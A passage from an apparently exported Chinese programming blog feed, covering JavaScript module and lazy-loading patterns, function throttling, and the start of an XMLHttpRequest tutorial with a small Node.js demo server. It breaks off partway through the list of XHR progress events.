<h3 id="八：理解使用模块模式编写代码"><a href="#八：理解使用模块模式编写代码" class="headerlink" title="八：理解使用模块模式编写代码"></a>八：理解使用模块模式编写代码</h3><p>使用函数和闭包可以构建模块，所谓模块，就是一个提供接口却隐藏状态与实现的函数或对象。使用函数构建模块的优点是：减少全局变量的使用；</p>
<p>比如如下：我想为<code>String</code>扩展一个方法，该方法的作用是寻找字符串中的<code>HTML</code>字符字体并将其替换为对应的字符；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下代码：</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'deentityify'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> entity = &#123;</span><br><span class="line">        quot: <span class="string">'"'</span>,</span><br><span class="line">        It: <span class="string">'&lt;'</span>,</span><br><span class="line">        gt: <span class="string">'&gt;'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/&amp;([^&amp;;]+);/g</span>,<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> r = entity[b];</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">typeof</span> r === <span class="string">'string'</span> ? r : a;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"&amp;It;&amp;quot;&amp;gt;"</span>.deentityify()); <span class="comment">// &lt;"&gt;</span></span><br></pre></td></tr></table></figure>
<p>模块模式利用函数作用域和闭包来创建绑定对象与私有成员的关联，比如在上面的<code>deentityify()</code>方法才有权访问字符实体表<code>entity</code>这个数据对象；</p>
<p>模块开发的一般形式是：定义了私有变量和函数的函数，利用闭包创建可以访问到的私有变量和函数的特权函数，最后返回这个特权函数，或把他们保存到可以访问的地方。</p>
<p>模块模式一般会结合实例模式使用。javascript的实例就是使用对象字面量表示法创建的。对象的属性值可以是数值或者函数，并且属性值在该对象的生命周期中不会发生变化；比如如下代码属于模块模式：定义了一个私有变量name属性，和一个实例模式(对象字面量obj)并且返回这个对象字面量obj，对象字面量中的方法与私有变量name进行了绑定；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 比如如下经典的模块模式</span></span><br><span class="line"><span class="keyword">var</span> MODULE = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">"tugenhua"</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        setName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;,</span><br><span class="line">        getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;)();</span><br><span class="line">MODULE.setName()</span><br><span class="line"><span class="built_in">console</span>.log(MODULE.getName()); <span class="comment">// tugenhua</span></span><br></pre></td></tr></table></figure>
<h3 id="九：理解惰性实列化"><a href="#九：理解惰性实列化" class="headerlink" title="九：理解惰性实列化"></a>九：理解惰性实列化</h3><p>在页面中javascript初始化执行的时候就实例化类，如果在页面中没有使用这个实列化的对象，就会造成一定的内存浪费和性能损耗；这时候，我们可以使用惰性实列化来解决这个问题，惰性就是把实列化推迟到需要使用它的时候才去做，做到 “按需供应”;</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 惰性实列化代码如下</span></span><br><span class="line"><span class="keyword">var</span> myNamespace = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Configure = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> privateName = <span class="string">"tugenhua"</span>;</span><br><span class="line">        <span class="keyword">var</span> privateGetName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> privateName;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> privateSetName = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">            privateName = name;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 返回单列对象</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            setName: <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">                privateSetName(name);</span><br><span class="line">            &#125;,</span><br><span class="line">            getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> privateGetName();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 存储Configure实列</span></span><br><span class="line">    <span class="keyword">var</span> instance;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 如果不存在实列，就创建单列实列</span></span><br><span class="line">            <span class="keyword">if</span>(!instance) &#123;</span><br><span class="line">                instance = Configure();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建Configure单列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> instance) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.hasOwnProperty(key)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>[key] = instance[key];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.init = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="comment">// 调用方式</span></span><br><span class="line">myNamespace.init();</span><br><span class="line"><span class="keyword">var</span> name = myNamespace.getName();</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">// tugenhua</span></span><br></pre></td></tr></table></figure>
<p>如上代码是惰性化实列代码：它包括一个单体Configure实列，直接返回init函数，先判断该单体是否被实列化，如果没有被实列化的话，则创建并执行实列化并返回该实列化，如果已经实列化了，则返回现有实列；执行完后，则销毁init方法，只初始化一次</p>
<p>十：惰性载入函数（也是解决兼容问题的）<br>和上面分支的原理是一样的，代码也可以按照上面的推荐分支风格编码的；解决的问题也是解决多个if条件判断的；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码如下：</span></span><br><span class="line"><span class="keyword">var</span> addEvent = <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>)</span>&#123;</span><br><span class="line">    addEvent = el.addEventListener ? <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>)</span>&#123;</span><br><span class="line">        el.addEventListener(type,handler,<span class="literal">false</span>);</span><br><span class="line">    &#125; : <span class="function"><span class="keyword">function</span>(<span class="params">el,type,handler</span>) </span>&#123;</span><br><span class="line">        el.attachEvent(<span class="string">"on"</span> + type,handler);</span><br><span class="line">    &#125;</span><br><span class="line">    addEvent(el,type,handler);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>惰性载入函数也是在函数内部改变自身的一种方式，在重复执行的时候就不会再进行检测的；惰性载入函数的分支只会执行一次，即第一次调用的时候，其优点如下：</p>
<ol>
<li><p>要执行的适当代码只有在实际调用函数时才执行。</p>
</li>
<li><p>第一次调用该函数的时候，紧接着内部函数也会执行，但是正因为这个，所以后续继续调用该函数的话，后续的调用速度会很快；因此避免了多重条件；</p>
</li>
</ol>
<h3 id="十一：理解函数节流"><a href="#十一：理解函数节流" class="headerlink" title="十一：理解函数节流"></a>十一：理解函数节流</h3><p>DOM操作的交互需要更多的内存和CPU时间，连续进行过多的DOM相关的操作可能会导致浏览器变慢甚至崩溃，函数节流的设计思想是让某些代码可以在间断的情况下连续重复执行，实现该方法可以使用定时器对该函数进行节流操作;</p>
<p>比如：第一次调用函数的时候，创建一个定时器，在指定的时间间隔下执行代码。当第二次执行的时候，清除前一次的定时器并设置另一个，将其替换成一个新的定时器;</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下简单函数节流代码演示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">method, context</span>) </span>&#123;</span><br><span class="line">    clearTimeout(method.tId);</span><br><span class="line">    method.tId = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        method.call(context);</span><br><span class="line">    &#125;,<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行操作</span></span><br><span class="line"><span class="built_in">window</span>.onresize = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    throttle(handle, <span class="built_in">window</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数节流解决的问题是一些代码(比如事件)无间断的执行，这可能会影响浏览器的性能，比如浏览器变慢或者直接崩溃。比如对于<code>mouseover</code>事件或者<code>click</code>事件，比如点击tab项菜单，无限的点击，有可能会导致浏览器会变慢操作，这时候我们可以使用函数节流的操作来解决；</p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-RESTFul_API指南</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_RESTFul_API%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>RESTFul</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-ajax及其优缺点</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_ajax%E5%8F%8A%E5%85%B6%E4%BC%98%E7%BC%BA%E7%82%B9/</url>
    <content><![CDATA[<h2 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h2><p class="tip">本文将不会讨论IE7之前版本浏览器的兼容实现，以标准的 XMLHttpRequest 实现</p>

<h4 id="小例子演示-XHR-的使用"><a href="#小例子演示-XHR-的使用" class="headerlink" title="小例子演示 XHR 的使用"></a>小例子演示 XHR 的使用</h4><p>为了更好的演示，我们将会结合 Nodejs 实现一个简单的服务器端程序，假设我们有如下文件：</p>
<ul>
<li>index.html —- 首页</li>
<li>app.js —- Nodejs 编写的处理请求的程序</li>
<li>ajax.js —- 被 index.html 引用的 js 文件，用来测试 XHR 代码</li>
<li>test.txt —- 存储数据，供XHR请求</li>
</ul>
<p>来看一下 app.js 的代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 sever 对象，监听 9090 端口</span></span><br><span class="line">http.createServer(<span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 分析请求的资源路径</span></span><br><span class="line">    <span class="keyword">let</span> reqUrl = request.url === <span class="string">'/'</span> ? <span class="string">'/index.html'</span> : request.url</span><br><span class="line">    <span class="keyword">let</span> extName = path.extname(reqUrl)</span><br><span class="line">    <span class="keyword">let</span> fileName = path.basename(reqUrl, extName)</span><br><span class="line">    extName = extName ? extName.substring(<span class="number">1</span>) : <span class="string">'html'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据分析请求的资源，返回相应的mime类型</span></span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">`text/<span class="subst">$&#123;extName&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果请求的不是 favicon.ico 就将资源返回</span></span><br><span class="line">    <span class="keyword">if</span> (reqUrl !== <span class="string">'/favicon.ico'</span>) &#123;</span><br><span class="line">        response.end(fs.readFileSync(<span class="string">'.'</span> + reqUrl))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">9090</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:9090/'</span>)</span><br></pre></td></tr></table></figure>
<p>上面的代码是一段很简单的node程序，根据请求的资源返回相应的内容。此时在终端执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure>
<p>访问：<a href="http://127.0.0.1:9090/" target="_blank" rel="noopener">http://127.0.0.1:9090/</a> ，我们将看到 <code>index.html</code> 的内容，因为 app.js 中我们做了如下处理：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> reqUrl = request.url === <span class="string">'/'</span> ? <span class="string">'/index.html'</span> : request.url</span><br></pre></td></tr></table></figure>
<p>如果请求的根路径 <code>/</code>，那么返回 <code>/index.html</code> 的内容。</p>
<p>再来看看 <code>index.html</code> 的内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>test ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        test ajax</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"ajax.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的不得了，仅仅引用了 <code>ajax.js</code> 文件。</p>
<p>这个时候，我们的服务端程序会接收到对 <code>ajax.js</code> 文件的请求，我们做了正确的处理并返回。</p>
<p>最后，我们还需要一个 <code>test.txt</code> 文件，我们随意写一些内容然后保存，比如我们写一句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// test.txt</span><br><span class="line">This is a test file</span><br></pre></td></tr></table></figure>
<p>下面，我们就可以使用 XHR 来请求 <code>test.txt</code> 的内容了。</p>
<p>编辑 <code>ajax.js</code> 文件，最简单的 XHR 使用仅仅需要三行代码，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'test.txt'</span>)</span><br><span class="line">xhr.send()</span><br></pre></td></tr></table></figure>
<p>首先实例化 <code>XMLHttpRequest</code> 对象，然后调用实例的 <code>open</code> 方法打开一个连接，最后调用 <code>send</code> 方法发送请求。注意：调用 <code>open</code> 方法并不会发送请求。</p>
<p><code>open</code> 方法接受三个参数：1、要发送请求的方法类型。2、请求的URL。3、一个boolean值，代表是否异步。如果不传第三个参数，默认是异步的。</p>
<p>重启服务，发现控制台会有如下输出：</p>
<p><img src="/static/img/ajax1.png" width="700"></p>
<p>证明我们的请求成功了，但是我们还没有能够获取到数据，那么如何获取到数据呢？实际上，如果请求成功且数据成功返回，那么数据会自动填充到 xhr 对象的相应属性下，我们需要注意的 xhr 属性如下：</p>
<ul>
<li><code>xhr.responseText</code> —- 作为响应主体被返回的文本</li>
<li><code>xhr.responseXML</code> —- 如果响应的内容类型(Content-Type)为 <code>text/xml</code> 或者 <code>application/xml</code>，那么这个属性将保存着响应数据的 XML DOM 文档。</li>
<li><code>status</code> —- 响应的 HTTP 状态码</li>
<li><code>statusText</code> —- 相应状态码的文字说明</li>
</ul>
<p>如果请求是异步的，那么还需要注意如下属性：</p>
<ul>
<li><code>readyState</code> —- 该属性是一个 Number 类型值，分别为：0，1，2，3，4。代表请求/响应的不同阶段：<ul>
<li>0：未初始化，即还没有调用 <code>open</code> 方法</li>
<li>1：启动，已经调用 <code>open</code>，但还没有调用 <code>send</code></li>
<li>2：发送，已经调用 <code>send</code>，但还没有接收到响应</li>
<li>3：接收，已经接收到数据，但还没有接收完成</li>
<li>4：完成，已经接收完成，数据可用了</li>
</ul>
</li>
</ul>
<p>异步的情况下，除了要注意 <code>readyState</code> 属性外，还需要一个事件，因为我们需要在这个事件处理程序中操作数据，这个事件的名字叫做：<code>readystatechange</code>，顾名思义，这个事件代表着当 <code>readyState</code> 变化时触发。一般请求下，我们只考虑 <code>readyState</code> 值变为 4 的阶段，因为这个阶段的数据已经接收完成，且可以使用了。</p>
<p>那么针对之前的例子，我们只需要添加如下代码，就可以获取到请求的数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.addEventListener(<span class="string">'readystatechange'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status === <span class="number">304</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(xhr.responseText)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(xhr.status)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'test.txt'</span>)</span><br><span class="line">xhr.send()</span><br></pre></td></tr></table></figure>
<p>我们通过 <code>addEventListener</code> 给 <code>xhr</code> 对象添加了 <code>readystatechange</code> 事件，并在里面作如下判断：</p>
<p>当 <code>xhr.readyState</code> 状态等于 4 时才要处理数据，接着判断状态码，只有状态码 在区间 <code>[200, 300)</code> 时或者等于 <code>304</code> 时才代表获取数据成功，正常显示数据，否则将状态码打印出来。</p>
<p>另外要注意，该事件必须要在调用 <code>open</code> 方法之前设置。</p>
<p>刷新页面，我们能看到数据已经得到了：</p>
<p><img src="/static/img/ajax2.png" width="700"></p>
<h4 id="XHR-属性、方法、事件-汇总"><a href="#XHR-属性、方法、事件-汇总" class="headerlink" title="XHR 属性、方法、事件 汇总"></a>XHR 属性、方法、事件 汇总</h4><p>一下列出的属性、方法以及事件，包含XHR1级以及2级的全部规范内容，由于浏览器对2级规范的实现并不完善，所以对于XHR2级规范会标注出来。</p>
<h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><h6 id="responseText"><a href="#responseText" class="headerlink" title="responseText"></a>responseText</h6><ul>
<li>描述：保存中响应主体返回的文本</li>
<li>类型：<code>String</code></li>
</ul>
<h6 id="responseXML"><a href="#responseXML" class="headerlink" title="responseXML"></a>responseXML</h6><ul>
<li>描述：如果响应的内容类型(Content-Type)为 <code>text/xml</code> 或者 <code>application/xml</code> 那么这个属性保存着包含响应内容的XML DOM文档。</li>
</ul>
<h6 id="status"><a href="#status" class="headerlink" title="status"></a>status</h6><ul>
<li>描述：响应的HTTP状态码，如：<code>200</code>、<code>304</code> 等</li>
<li>类型：<code>Number</code></li>
</ul>
<h6 id="statusText"><a href="#statusText" class="headerlink" title="statusText"></a>statusText</h6><ul>
<li>描述：对 <code>status</code> 状态码的文本描述</li>
<li>类型：<code>String</code></li>
</ul>
<h6 id="readyState"><a href="#readyState" class="headerlink" title="readyState"></a>readyState</h6><ul>
<li>描述：一个数字，标示着当前请求/响应的某一个阶段<ul>
<li>0：未初始化，即还没有调用 <code>open</code> 方法</li>
<li>1：启动，已经调用 <code>open</code>，但还没有调用 <code>send</code></li>
<li>2：发送，已经调用 <code>send</code>，但还没有接收到响应</li>
<li>3：接收，已经接收到数据，但还没有接收完成</li>
<li>4：完成，已经接收完成，数据可用了</li>
</ul>
</li>
<li>类型：<code>Number</code></li>
</ul>
<h6 id="【XHR2】timeout"><a href="#【XHR2】timeout" class="headerlink" title="【XHR2】timeout"></a>【XHR2】timeout</h6><ul>
<li>描述：可以给 <code>xhr.timeout</code> 属性设置一个数字值，代表请求多少毫秒之后超时，超时后将触发同样是XHR2级规范定义的 <code>timeout</code> 事件。</li>
<li>示例：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.timeout = <span class="number">1000</span>  <span class="comment">// 1秒后超时</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h6 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h6><ul>
<li>描述：<code>xhr.upload</code> 属性返回一个 <code>XMLHttpRequestUpload</code> 对象，用来表示上传的进度，该对象是不透明的，可以通过为其绑定事件来跟踪进度。</li>
<li>示例：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">'POST'</span>, url)</span><br><span class="line">xhr.onreadystatechange = () =&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">xhr.upload.addEventListener(<span class="string">'progress'</span>, event =&gt; &#123;</span><br><span class="line">    <span class="comment">// event.lengthComputable 文件是否可计算</span></span><br><span class="line">    <span class="keyword">if</span> (event.lengthComputable) &#123;</span><br><span class="line">        <span class="comment">// 计算上传进度百分比</span></span><br><span class="line">        <span class="keyword">let</span> percentage = <span class="built_in">Math</span>.round(event.loaded / event.total * <span class="number">100</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'无法计算'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">xhr.upload.addEventListener(<span class="string">'load'</span>, () =&gt; &#123;&#125;)</span><br><span class="line">xhr.upload.addEventListener(<span class="string">'error'</span>, () =&gt; &#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>能够在 <code>xhr.upload</code> 上监听的事件有：</p>
<table>
<thead>
<tr>
<th>事件</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>loadstart</td>
<td style="text-align:center">开始上传</td>
</tr>
<tr>
<td>progress</td>
<td style="text-align:center">传输中</td>
</tr>
<tr>
<td>abort</td>
<td style="text-align:center">终止操作</td>
</tr>
<tr>
<td>error</td>
<td style="text-align:center">失败</td>
</tr>
<tr>
<td>load</td>
<td style="text-align:center">成功</td>
</tr>
<tr>
<td>timeout</td>
<td style="text-align:center">超时</td>
</tr>
<tr>
<td>loadend</td>
<td style="text-align:center">完成（不论成功与否）</td>
</tr>
</tbody>
</table>
<h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><h6 id="open-method-url-async"><a href="#open-method-url-async" class="headerlink" title="open(method, url[, async])"></a>open(method, url[, async])</h6><ul>
<li><p>描述：启动一个请求，但不会发送。</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} method</code> 请求的方法，如：<code>get</code>、<code>post</code> 等</li>
<li><code>{String} url</code> 请求的URL</li>
<li><code>{Boolean} async</code> 一个布尔值，代表着是否异步发送请求，默认 <code>true</code> 异步</li>
</ul>
</li>
</ul>
<h6 id="send-data"><a href="#send-data" class="headerlink" title="send(data)"></a>send(data)</h6><ul>
<li><p>描述：发送通过 <code>open</code> 方法启动的请求</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String/FormData} data</code> 作为请求主体发送的数据</li>
</ul>
</li>
<li><p>【XHR2】扩展：XHR2允许给 <code>send</code> 方法传递一个 <code>FormData</code> 实例。<code>FormData</code> 接收一个可选的参数，参数为 form 表单元素，如下：</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.forms[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData(form)</span><br></pre></td></tr></table></figure>
<p>在XHR1级的时候，我们要手动序列化表单的数据然后构造一个合适的字符串。而 <code>FormData</code> 会自动序列化表单，用于创建与表单格式相同的数据用于XHR传输，这样服务端接收数据的时候就能够对传统的表单提交一视同仁，为我们节省了不少事情。</p>
<p><code>FormData</code> 除了上述好处之外，也不需要我们手动设置请求头部，在XHR1级的时候，除了手动序列化表单，为了模拟真正的表单提交，我们需要设置相应的请求头部信息才行，比如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>)</span><br></pre></td></tr></table></figure>
<h6 id="setRequestHeader-key-val"><a href="#setRequestHeader-key-val" class="headerlink" title="setRequestHeader(key, val)"></a>setRequestHeader(key, val)</h6><ul>
<li><p>描述：设置要发送的请求头部信息</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} key</code> 头部字段的名称</li>
<li><code>{String} val</code> 头部字段的值</li>
</ul>
</li>
<li><p>注意：该方法必须要在调用 <code>open</code> 方法之后且调用 <code>send</code> 方法之前发送才能生效</p>
</li>
</ul>
<h6 id="getResponseHeader-key"><a href="#getResponseHeader-key" class="headerlink" title="getResponseHeader(key)"></a>getResponseHeader(key)</h6><ul>
<li><p>描述：根据指定的响应头部字段名称，获取响应头部字段的值</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} key</code> 响应头部字段的名称</li>
</ul>
</li>
</ul>
<h6 id="getAllResponseHeaders"><a href="#getAllResponseHeaders" class="headerlink" title="getAllResponseHeaders()"></a>getAllResponseHeaders()</h6><ul>
<li><p>描述：获取所有头部信息作为一个长字符串</p>
</li>
<li><p>示例：如第一小节的例子中，调用该方法将得到如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Date: Fri, 09 Jun 2017 08:37:44 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h6 id="【XHR2】overrideMimeType"><a href="#【XHR2】overrideMimeType" class="headerlink" title="【XHR2】overrideMimeType()"></a>【XHR2】overrideMimeType()</h6><ul>
<li>描述：重写响应数据的mime类型</li>
<li>意义：我们知道 <code>xhr</code> 对象拥有 <code>responseXML</code> 属性，当服务端返回的数据的内容类型是 <code>text/xml</code> 或 <code>application/xml</code> 时，数据将最为XML DOM保存在 <code>responseXML</code> 属性中，但是，如果服务端响应的内容类型是：<code>text/plain</code>，而事实上数据确实是可以作为 XML 解析的，此时 <code>responseXML</code> 属性为空，为了重新让该属性保存着能够用于 XML 解析的数据，我们就可以使用 <code>overrideMimeType</code> 方法重写mime类型：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'xml.php'</span>)</span><br><span class="line">xhr.overrideMimeType(<span class="string">'text/xml'</span>)</span><br><span class="line">xhr.send()</span><br></pre></td></tr></table></figure>
<h5 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h5><h6 id="readystatechange"><a href="#readystatechange" class="headerlink" title="readystatechange"></a>readystatechange</h6><ul>
<li>描述：当 <code>xhr.readyState</code> 属性值变化时触发。</li>
<li>注意：该事件必须要在调用 <code>open</code> 方法之前设置</li>
</ul>
<h6 id="【XHR2】timeout-1"><a href="#【XHR2】timeout-1" class="headerlink" title="【XHR2】timeout"></a>【XHR2】timeout</h6><ul>
<li>描述：当请求在 <code>xhr.timeout</code> 属性所设置的规定事件内没有完成，将触发该事件，代表请求超时</li>
</ul>
<h5 id="进度事件"><a href="#进度事件" class="headerlink" title="进度事件"></a>进度事件</h5><h6 id="loadstart"><a href="#loadstart" class="headerlink" title="loadstart"></a>loadstart</h6><ul>
<li>描述：接收到响应数据的第一个字节时触发</li>
</ul>
<h6 id="progress"><a href="#progress" class="headerlink" title="progress"></a>progress</h6><ul>
<li>描述：接收响应数据期间持续触发</li>
<li>事件对象的重要属性：<ul>
<li><code>event.lengthComputable</code> —- 一个boolean值，表示进度信息是否可用</li>
<li><code>event.position</code> —- 表示已经接收的字节数</li>
